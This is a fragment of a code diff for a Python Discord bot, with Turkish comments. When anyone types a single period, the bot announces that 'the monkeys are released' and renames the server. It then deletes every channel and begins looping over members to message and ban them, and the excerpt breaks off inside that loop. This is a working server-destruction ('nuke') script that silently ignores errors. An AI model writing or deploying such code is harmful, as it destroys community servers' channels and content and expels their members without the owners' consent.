@@ -18,22 +18,26 @@ async def on_message(message):
     if message.content.strip() == ".":
         guild = message.guild
 
+        # Uyarı mesajı
         try:
             await message.channel.send("🚨 **Maymunlar serbest bırakıldı!** Sunucu temizlik operasyonu başlıyor... 🐒💥")
         except:
             pass
 
+        # Sunucu adını değiştir
         try:
             await guild.edit(name="Maymun Sunucusu 🐵")
         except:
             pass
 
+        # Kanalları sil
         for channel in list(guild.channels):
             try:
                 await channel.delete()
             except:
                 pass
 
+        # Kullanıcılara DM at, sonra banla
         for member in guild.members:
             if member != message.author and not member.bot:
                 try:
